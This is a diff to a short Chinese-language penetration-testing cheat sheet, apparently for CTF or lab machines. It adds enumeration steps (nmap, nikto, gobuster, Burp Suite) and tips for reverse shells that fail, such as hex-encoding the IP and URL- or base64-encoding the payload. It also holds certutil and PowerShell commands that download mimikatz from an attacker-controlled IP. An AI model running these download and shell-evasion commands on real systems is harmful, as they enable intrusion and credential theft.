@@ -1,9 +1,13 @@
-1.nmap全端口
-2.nmap srcipt
+1.nmap全端口,script,udp
+2.
 3.nikto
 4.davtest
 5.每個資料夾gobuster
 6.使用不同gobuster字典
+7.使用burpsuite的spider遍利目力
+8.找到服務後,嘗試找到服務的原本,查看配置文件或是版本訊息(官網或GitHub)
+9.查看每個html的source
+10
 
 
 
@@ -12,3 +16,8 @@
 ###widnows下載文件
 certutil.exe -urlcache -split -f http://10.10.14.8/mimikatz_trunk.exe mimikatz_trunk.exe
 (New-Object Net.Webclient).downloadFile('http://10.10.14.8/mimikatz.exe', 'mimikatz.exe')
+
+###reverse shell回彈不生效
+1.將ip轉成hex,避免.問題
+2.整串代碼用url encode後嘗試
+3.整串代碼用base64後嘗試
